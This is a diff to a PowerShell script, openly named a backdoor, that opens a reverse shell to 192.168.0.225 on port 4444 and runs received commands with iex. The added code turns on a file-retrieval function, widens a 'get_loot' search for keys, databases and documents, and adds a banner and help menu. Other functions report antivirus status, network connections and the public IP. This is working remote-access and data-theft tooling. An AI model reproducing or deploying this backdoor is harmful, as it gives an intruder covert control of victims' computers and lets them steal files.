@@ -44,7 +44,7 @@ function get_loot($help, $directory) {
         return "Searches a directory for intresting files `nsyntax: get_loot --directory C:\"
     }
     $lines = ''
-    $fileNames = Get-ChildItem $directory -Recurse -Include *.doc,*.pdf,*.json,*.pem,*.xlsx, *.xls, *.csv, *.txt
+    $fileNames = Get-ChildItem $directory -Recurse -Include *.doc,*.pdf,*.json,*.pem,*.xlsx, *.xls, *.csv, *.txt *.db, *.exe
     foreach ($f in $fileNames) {
         $filename = $f.FullName
         $lines += "$filename `n"
@@ -97,17 +97,37 @@ function get_antivirus($help) {
 
 }
 
-# function get_file($remote, $local, $help) {
-#      if ($help -eq "--help" -or $local -eq $null -or $remote -eq $null) {
-#         return "Gets a local file and saves it to your computer `nsyntax: get_file <remote_path> <local_path>`n Please use absolute paths!"
-#     }
-#     $content = Get-Content -Path $remote
-#     return [System.Tuple]::Create($local, $content)
-# }
+function get_file($remote, $local, $help) {
+     if ($help -eq "--help" -or $local -eq $null -or $remote -eq $null) {
+        return "Downloads a remote file and saves it to your computer `nsyntax: get_file <remote_path> <local_path>`nPlease use absolute paths!"
+    }
+    try {
+        $content = Get-Content -Path $remote
+    } catch {
+        $e = $_.Exception
+        $msg = $e.Message
+        $output = "`n$msg`n" 
+        return $output 
+    }
+    return $content
+}
+
+function print_help() {
+    return "
+    get_antivirus - Gets infomation about Windows Defender
+    get_os        - Gets infomation about the current OS build
+    get_active    - Lists active TCP connections
+    get_bios      - Gets the BIOS's manufacturer name, bios name, and firmware type
+    get_public_ip - Makes a network request to api.ipify.org to and returns the computers public IP address
+    get_loot      - Searches a directory for intresting files --help (syntax)
+    get_tools     - Checks to see what tools are installed on the system
+    get_file      - Downloads a remote file and saves it to your computer --help (syntax)
+    "
+}
 
 class Backdoor {
     # Change this to the correct ip/port
-    [string]$ipAddress = "127.0.0.1"
+    [string]$ipAddress = "192.168.0.225"
     [int]$port = 4444
     $stream 
     $client
@@ -125,8 +145,7 @@ class Backdoor {
         $this.reader = New-Object System.IO.StreamReader($this.stream)
         $this.writer.AutoFlush = $true;
         $this.handleClient()
-        $this.computerName = [System.Net.Dns]::GetHostName()
-  
+
     }
 
     writeToStream($content) {
@@ -135,29 +154,45 @@ class Backdoor {
     }
 
     handleClient() {
+        $this.writeToStream("
+     /| 
+    / |ejm
+   /__|______
+  |  __  __  |
+  | |  ||  | | 
+  | |__||__| |== sh!
+  |  __  __()|/      ...I'm not really here.
+  | |  ||  | |       
+  | |  ||  | |       [*] Use print_help to show all commands
+  | |__||__| |       [*] Today's Date: $(date)
+  |__________|`n`n")
         while ($this.client.Connected) {
-            $currentUser = [Environment]::UserName
-            $computerName = [System.Net.Dns]::GetHostName()
-            $pwd = Get-Location
-            $prompt = "$currentUser@$computerName [$pwd]~$ "
-            $this.writeToStream($prompt)         
-            $rawResponse = $this.stream.Read($this.buffer, 0, 1024)    
-            $response = ($this.encoding.GetString($this.buffer, 0, $rawResponse))
-            $output = "`n"
-            try { 
-                $output = iex $response | Out-String
-                if ($response.Contains("get_file") -and $output.item1 -ne $null) {
-                    $output.item2 | Out-File $output.item1
-                } else {
+                $currentUser = [Environment]::UserName
+                $computerName = [System.Net.Dns]::GetHostName()
+                $pwd = Get-Location
+                $prompt = "$currentUser@$computerName [$pwd]~$ "
+                $this.writeToStream($prompt)         
+                $rawResponse = $this.stream.Read($this.buffer, 0, 1024)    
+                $response = ($this.encoding.GetString($this.buffer, 0, $rawResponse))
+                $output = "`n"
+                if ([string]::IsNullOrEmpty($response)) {
+                    continue
+                }
+                try { 
+                    $output = iex $response | Out-String
+                    $this.writeToStream($output + "`n")
+                    }
+                 catch {
+                    $e = $_.Exception
+                    $msg = $e.Message
+                    $output = "`n$msg`n"  
                     $this.writeToStream($output + "`n")
                 }
-            } catch {
-                $e = $_.Exception
-                $msg = $e.Message
-                $output = "`n$msg`n"  
-                $this.writeToStream($output + "`n")
-            }
-        }
+        }     
+        # Clear the stream
+        $this.stream.Flush()
+        # Close the TCP socket
+        $this.client.Close()
     }
 }
 
